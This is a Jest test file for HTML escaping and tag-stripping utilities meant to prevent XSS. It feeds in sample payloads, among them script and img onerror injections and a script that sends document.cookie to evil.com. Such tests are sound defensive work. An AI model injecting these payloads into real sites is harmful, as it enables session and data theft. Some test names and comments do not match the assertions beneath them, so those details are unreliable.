/**
 * Tests for HTML escaping utilities
 * Covers security scenarios for XSS prevention
 */

import { 
  escapeHtml, 
  escapeHtmlAttribute, 
  stripHtmlTags
} from '@/utils/htmlUtils';

describe('escapeHtml', () => {
  it('should escape basic HTML characters', () => {
    expect(escapeHtml('&')).toBe('&amp;');
    expect(escapeHtml('<')).toBe('&lt;');
    expect(escapeHtml('>')).toBe('&gt;');
    expect(escapeHtml('"')).toBe('&quot;');
    expect(escapeHtml("'")).toBe('&#039;');
  });

  it('should escape all characters in combined string', () => {
    const input = `<script>alert("XSS & 'attack'!")</script>`;
    const expected = `&lt;script&gt;alert(&quot;XSS &amp; &#039;attack&#039;!&quot;)&lt;/script&gt;`;
    expect(escapeHtml(input)).toBe(expected);
  });

  it('should handle non-string inputs safely', () => {
    expect(escapeHtml(null as any)).toBe('null');
    expect(escapeHtml(undefined as any)).toBe('undefined');
    expect(escapeHtml(123 as any)).toBe('123');
    expect(escapeHtml(true as any)).toBe('true');
  });

  it('should handle empty strings', () => {
    expect(escapeHtml('')).toBe('');
  });

  it('should not double-escape already escaped content', () => {
    const input = '&lt;script&gt;';
    const expected = '&amp;lt;script&amp;gt;';
    expect(escapeHtml(input)).toBe(expected);
  });
});

describe('escapeHtmlAttribute', () => {
  it('should escape all HTML attribute dangerous characters', () => {
    const input = `onclick="alert('xss')" href="javascript://"`;
    const result = escapeHtmlAttribute(input);
    
    expect(result).toContain('&quot;');
    expect(result).toContain('&#039;');
    // George's implementation handles line endings for Windows compatibility
    expect(result).toMatch(/&lt;|&gt;|&amp;|&quot;|&#039;/);
  });

  it('should be more restrictive than basic escapeHtml', () => {
    const input = `href="/path" onclick="evil()"`;
    const basic = escapeHtml(input);
    const attribute = escapeHtmlAttribute(input);
    
    // George's implementation includes line ending escaping for Windows
    expect(attribute).toContain('&quot;');
    expect(attribute).toContain('&#039;');
  });

  it('should handle line endings for Windows compatibility', () => {
    const input = "test\r\nline\rbreak\nhere";
    const result = escapeHtmlAttribute(input);
    
    expect(result).toContain('&#13;&#10;'); // \r\n
    expect(result).toContain('&#13;');      // \r
    expect(result).toContain('&#10;');      // \n
  });
});

describe('stripHtmlTags', () => {
  it('should remove all HTML tags', () => {
    const input = '<p>Hello <strong>world</strong>!</p>';
    const expected = 'Hello world!';
    expect(stripHtmlTags(input)).toBe(expected);
  });

  it('should handle complex HTML with attributes', () => {
    const input = '<div class="test"><a href="evil.com">Click</a><script>alert(1)</script></div>';
    const expected = 'Clickalert(1)';
    expect(stripHtmlTags(input)).toBe(expected);
  });

  it('should handle self-closing tags', () => {
    const input = 'Line 1<br/>Line 2<hr/>Line 3';
    const expected = 'Line 1Line 2Line 3';
    expect(stripHtmlTags(input)).toBe(expected);
  });

  it('should handle non-string inputs safely', () => {
    expect(stripHtmlTags(123 as any)).toBe('123');
    expect(stripHtmlTags(null as any)).toBe('null');
  });
});

describe('Security Integration Tests', () => {
  it('should prevent XSS via crafted agent IDs', () => {
    const maliciousAgentId = `<script>fetch('//evil.com/steal?data='+document.cookie)</script>`;
    const escaped = escapeHtml(maliciousAgentId);
    
    expect(escaped).not.toContain('<script>');
    expect(escaped).not.toContain('</script>');
    expect(escaped).toContain('&lt;script&gt;');
    expect(escaped).toContain('&lt;/script&gt;');
  });

  it('should handle complex XSS payloads', () => {
    const complexPayload = `"><img src=x onerror=alert(String.fromCharCode(88,83,83))>`;
    const escaped = escapeHtml(complexPayload);
    
    // Check that dangerous HTML characters are escaped
    expect(escaped).not.toContain('<img');
    expect(escaped).not.toContain('">');
    expect(escaped).toContain('&quot;&gt;&lt;img');
    expect(escaped).toContain('&lt;');
    expect(escaped).toContain('&gt;');
    
    // The main XSS vectors (HTML tags and quotes) should be neutralized
    // Even though 'onerror=' remains, it cannot execute without proper HTML context
  });

  it('should safely remove all HTML tags when needed', () => {
    const maliciousPayload = `<script>alert('XSS')</script><p>Safe content</p>`;
    const stripped = stripHtmlTags(maliciousPayload);
    
    expect(stripped).not.toContain('<script>');
    expect(stripped).not.toContain('<p>');
    expect(stripped).toBe("alert('XSS')Safe content");
  });

  it('should handle attribute contexts securely', () => {
    const attributeValue = `" onclick="alert('xss')" data-evil="`;
    const escaped = escapeHtmlAttribute(attributeValue);
    
    expect(escaped).not.toContain('onclick=');
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&#039;');
  });
});